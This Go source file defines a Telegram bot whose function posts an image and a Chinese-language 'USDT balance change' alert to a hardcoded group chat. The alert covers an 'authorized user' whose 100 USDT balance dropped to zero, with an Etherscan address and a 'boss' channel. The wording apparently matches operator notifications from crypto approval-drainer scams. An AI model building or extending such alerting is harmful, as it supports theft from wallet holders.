package telegram

import (
	"bytes"
	"context"
	"fmt"
	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"os"
)

type TelegramBot struct {
	bot *bot.Bot
}

func NewTelegramBot(token string) (*TelegramBot, error) {
	opts := []bot.Option{
		//bot.WithDefaultHandler(handler),
	}

	b, _ := bot.New(token, opts...)
	return &TelegramBot{bot: b}, nil

}
func (telegramBot *TelegramBot) SendUserApproval(ctx context.Context) {
	fileData, errReadFile := os.ReadFile("./logo.png")
	if errReadFile != nil {
		fmt.Printf("error read file, %v\n", errReadFile)
		return
	}
	kb := &models.InlineKeyboardMarkup{
		InlineKeyboard: [][]models.InlineKeyboardButton{
			{
				{Text: "点击查看哈希值", URL: "https://etherscan.io/address/0xbb4c0cE7E0c4092Ca8bF44d06aBe91382848F72E"},
				{Text: "点击查看地址", URL: "https://etherscan.io/address/0xbb4c0cE7E0c4092Ca8bF44d06aBe91382848F72E"},
			},
		},
	}

	params := &bot.SendPhotoParams{
		ChatID:  -4027758656,
		Photo:   &models.InputFileUpload{Filename: "logo.png", Data: bytes.NewReader(fileData)},
		Caption: "💡️ ️用户USDT余额变动提醒 💡️\n🆔用户ID：40293\n 🙅🏻‍备注：\n 🈲变动前余额：100.000000\n 💹变动金额：-100.000000\n💲当前USDT余额：0.000000\n💲当前ETH余额：0.000000\n🔥用户地址：0xbb4c0cE7E0c4092Ca8bF44d06aBe91382848F72E\n 👁用戶類型：授權用戶\n 🚀一级渠道：boss\n",

		ReplyMarkup: kb,
	}

	telegramBot.bot.SendPhoto(ctx, params)
}
